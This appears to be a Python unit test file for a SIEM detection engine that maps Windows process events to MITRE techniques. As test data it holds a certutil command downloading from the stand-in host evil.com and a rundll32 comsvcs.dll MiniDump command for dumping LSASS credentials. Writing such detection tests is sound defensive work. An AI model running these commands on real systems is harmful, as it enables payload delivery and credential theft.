# -*- coding: utf-8 -*-
import unittest
import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from engine.wazuh_sigma_correlator import WazuhSigmaCorrelator

class TestSOCSIEMExtended(unittest.TestCase):
    def setUp(self):
        self.correlator = WazuhSigmaCorrelator()

    def test_certutil_ingress_detection(self):
        event = {
            "agent": {"name": "srv-edge"},
            "data": {"win": {"eventdata": {"image": "certutil.exe", "commandLine": "certutil -urlcache -split -f http://evil.com/x"}}}
        }
        alerts = self.correlator.evaluate_telemetry(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["mitre"], "T1105")

    def test_lsass_dump_detection(self):
        event = {
            "agent": {"name": "dc01"},
            "data": {"win": {"eventdata": {"image": "rundll32.exe", "commandLine": "rundll32 comsvcs.dll MiniDump 100"}}}
        }
        alerts = self.correlator.evaluate_telemetry(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["severity"], "CRITICAL")
        self.assertEqual(alerts[0]["mitre"], "T1003.001")

    def test_benign_event_no_alert(self):
        event = {
            "agent": {"name": "wk01"},
            "data": {"win": {"eventdata": {"image": "calc.exe", "commandLine": "calc.exe"}}}
        }
        alerts = self.correlator.evaluate_telemetry(event)
        self.assertEqual(len(alerts), 0)

if __name__ == "__main__":
    unittest.main()
